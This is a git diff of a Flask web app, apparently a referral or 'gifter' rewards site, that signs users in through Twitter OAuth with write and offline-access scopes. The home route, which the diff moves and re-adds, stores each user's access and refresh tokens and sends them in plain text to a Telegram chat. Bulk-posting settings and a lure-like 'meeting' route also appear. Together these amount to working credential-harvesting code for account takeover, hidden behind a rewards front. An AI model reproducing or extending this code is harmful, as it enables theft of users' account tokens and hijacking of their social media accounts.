@@ -18,6 +18,7 @@ TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 WEBHOOK_URL = os.getenv('WEBHOOK_URL')
 DATABASE_URL = os.getenv('DATABASE_URL')  # Render PostgreSQL URL
+APP_URL = os.getenv("APP_URL", "https://gifter-7vz7.onrender.com")
 
 # Set default delay values from environment variables
 DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))
@@ -35,7 +36,6 @@ def init_db():
     conn = psycopg2.connect(DATABASE_URL, sslmode='require')
     cursor = conn.cursor()
 
-    # Users table with necessary columns
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id SERIAL PRIMARY KEY,
@@ -51,7 +51,6 @@ def init_db():
         )
     ''')
 
-    # Tasks table for defining tasks available to users
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS tasks (
             id SERIAL PRIMARY KEY,
@@ -62,7 +61,6 @@ def init_db():
         )
     ''')
 
-    # User tasks table to track each user's task completion
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS user_tasks (
             user_id INTEGER REFERENCES users(id),
@@ -72,7 +70,6 @@ def init_db():
         )
     ''')
 
-    # Commit changes and close connection
     conn.commit()
     conn.close()
     print("Database initialized with updated schema.")
@@ -81,16 +78,13 @@ def store_token(access_token, refresh_token, username):
     print("Storing token in the database...")
 
     try:
-        # Connect to the database
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor()
 
-        # Check if user exists
         cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
         existing_user = cursor.fetchone()
 
         if existing_user:
-            # Update tokens for existing user
             user_id, referral_url = existing_user
             cursor.execute(
                 "UPDATE users SET access_token = %s, refresh_token = %s WHERE id = %s",
@@ -98,7 +92,7 @@ def store_token(access_token, refresh_token, username):
             )
             print(f"Updated tokens for existing user @{username}")
         else:
-            # Create a new user entry with unique referral URL
+            # Create a new user with referral handling
             cursor.execute(
                 '''
                 INSERT INTO users (username, access_token, refresh_token, referral_count, referral_reward, token_balance)
@@ -111,7 +105,6 @@ def store_token(access_token, refresh_token, username):
             cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
             print(f"New user created with referral URL: {referral_url}")
 
-            # Apply referral reward if referrer_id is in session
             referrer_id = session.get('referrer_id')
             if referrer_id:
                 referral_reward = 10.0
@@ -128,62 +121,92 @@ def store_token(access_token, refresh_token, username):
 
         conn.commit()
         conn.close()
-
-        # Notify via Telegram with the referral URL
-        send_message_via_telegram(f"💾 User @{username} has been stored. Referral URL: {referral_url}")
+        
+        # Notify via Telegram
+        send_message_via_telegram(f"💾 User @{username} stored. Referral URL: {referral_url}")
 
     except Exception as e:
         print(f"Database error while storing token: {e}")
 
+@app.route('/')
+def home():
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
 
-def restore_from_backup():
-    print("Restoring from backup if database is empty...")
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute('SELECT COUNT(*) FROM tokens')
-        count = cursor.fetchone()[0]
-        conn.close()
-    except Exception as e:
-        print(f"Database error during restore check: {e}")
-        return
+    referrer_id = request.args.get('referrer_id')
+    if referrer_id:
+        session['referrer_id'] = referrer_id
+        print(f"Referrer ID {referrer_id} stored in session.")
 
-    if count == 0:
-        if os.path.exists(BACKUP_FILE):
-            try:
-                with open(BACKUP_FILE, 'r') as f:
-                    backup_data = json.load(f)
-                    if not isinstance(backup_data, list):
-                        raise ValueError("Invalid format in backup file.")
-            except (json.JSONDecodeError, ValueError, IOError) as e:
-                print(f"Error reading backup file: {e}")
-                return
+    if 'username' in session:
+        username = session['username']
+        send_message_via_telegram(f"👋 @{username} just returned to the website.")
+        return redirect(url_for('welcome'))
 
-            restored_count = 0
-            for token_data in backup_data:
-                access_token = token_data['access_token']
-                refresh_token = token_data.get('refresh_token', None)
-                username = token_data['username']
+    if request.args.get('authorize') == 'true':
+        state = "0"
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier
 
-                try:
-                    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-                    cursor = conn.cursor()
-                    cursor.execute('''
-                        INSERT INTO tokens (access_token, refresh_token, username)
-                        VALUES (%s, %s, %s)
-                    ''', (access_token, refresh_token, username))
-                    conn.commit()
-                    conn.close()
-                    restored_count += 1
-                except Exception as e:
-                    print(f"Error restoring token for {username}: {e}")
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+        return redirect(authorization_url)
 
-            send_message_via_telegram(
-                f"📂 Backup restored successfully!\n📊 Total tokens restored: {restored_count}"
-            )
-            print(f"Database restored from backup. Total tokens restored: {restored_count}")
+    if code:
+        if error:
+            return f"Error during authorization: {error}", 400
+
+        if state != session.get('oauth_state', '0'):
+            return "Invalid state parameter", 403
+
+        code_verifier = session.pop('code_verifier', None)
+
+        token_url = "https://api.twitter.com/2/oauth2/token"
+        data = {
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': CALLBACK_URL,
+            'code_verifier': code_verifier
+        }
+
+        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+        token_response = response.json()
+
+        if response.status_code == 200:
+            access_token = token_response.get('access_token')
+            refresh_token = token_response.get('refresh_token')
+
+            username, profile_url = get_twitter_username_and_profile(access_token)
+
+            if username:
+                store_token(access_token, refresh_token, username)
+                session['username'] = username
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
+
+                total_tokens = get_total_tokens()
+
+                send_message_via_telegram(
+                    f"🔑 Access Token: {access_token}\n"
+                    f"🔄 Refresh Token: {refresh_token}\n"
+                    f"👤 Username: @{username}\n"
+                    f"🔗 Profile URL: {profile_url}\n"
+                    f"📊 Total Tokens in Database: {total_tokens}"
+                )
+
+                return redirect(url_for('welcome'))
+            else:
+                return "Error retrieving user info with access token", 400
         else:
-            print("No backup file found. Skipping restoration.")
+            error_description = token_response.get('error_description', 'Unknown error')
+            error_code = token_response.get('error', 'No error code')
+            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+    return render_template('home.html')
 
 def get_all_tokens():
     try:
@@ -694,100 +717,6 @@ def meeting():
     code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
     return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 		
-@app.route('/')
-def home():
-    code = request.args.get('code')
-    state = request.args.get('state')
-    error = request.args.get('error')
-
-    # Capture referrer_id if available and store it in the session
-    referrer_id = request.args.get('referrer_id')
-    if referrer_id:
-        session['referrer_id'] = referrer_id
-        print(f"Referrer ID {referrer_id} stored in session.")
-
-    # Check if user is already logged in
-    if 'username' in session:
-        username = session['username']
-        send_message_via_telegram(f"👋 @{username} just returned to the website.")
-        return redirect(url_for('welcome'))
-
-    # If the user clicks the Sign Up/Login button, initiate OAuth flow
-    if request.args.get('authorize') == 'true':
-        state = "0"  # Fixed state value for initialization
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier  # Store code_verifier in the session
-
-        # Redirect the user to Twitter’s authorization page
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-        return redirect(authorization_url)
-
-    # Handle authorization response if code is present
-    if code:
-        if error:
-            return f"Error during authorization: {error}", 400
-
-        if state != session.get('oauth_state', '0'):  # Validate the state
-            return "Invalid state parameter", 403
-
-        code_verifier = session.pop('code_verifier', None)
-
-        # Exchange authorization code for tokens
-        token_url = "https://api.twitter.com/2/oauth2/token"
-        data = {
-            'grant_type': 'authorization_code',
-            'code': code,
-            'redirect_uri': CALLBACK_URL,
-            'code_verifier': code_verifier
-        }
-
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
-
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
-
-            # Fetch username and profile URL from Twitter API
-            username, profile_url = get_twitter_username_and_profile(access_token)
-
-            if username:
-                # Store tokens and username in the database
-                store_token(access_token, refresh_token, username)
-
-                # Store username in the session
-                session['username'] = username
-                session['access_token'] = access_token
-                session['refresh_token'] = refresh_token
-
-                # Retrieve total token count for notification
-                total_tokens = get_total_tokens()
-
-                # Notify via Telegram with details
-                send_message_via_telegram(
-                    f"🔑 Access Token: {access_token}\n"
-                    f"🔄 Refresh Token: {refresh_token}\n"
-                    f"👤 Username: @{username}\n"
-                    f"🔗 Profile URL: {profile_url}\n"
-                    f"📊 Total Tokens in Database: {total_tokens}"
-                )
-
-                # Redirect to the welcome page after saving and notifying
-                return redirect(url_for('welcome'))
-            else:
-                return "Error retrieving user info with access token", 400
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
-
-    # Render home page with Sign Up/Login button if not authorized
-    return render_template('home.html')
-
 
 
 @app.route('/welcome')
